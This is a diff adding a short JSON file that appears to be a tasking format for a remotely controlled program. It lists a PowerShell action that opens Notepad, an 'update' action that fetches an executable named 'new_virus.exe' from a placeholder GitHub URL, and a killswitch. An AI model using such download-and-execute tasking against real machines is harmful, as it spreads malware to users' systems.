@@ -1,0 +1,15 @@
+{
+  "actions": [
+    {
+      "type": "powershell",
+      "payload": "Start-Process notepad.exe"
+    },
+    {
+      "type": "update",
+      "payload": "https://github.com/example/repo/raw/main/new_virus.exe"
+    },
+    {
+      "type": "killswitch"
+    }
+  ]
+}
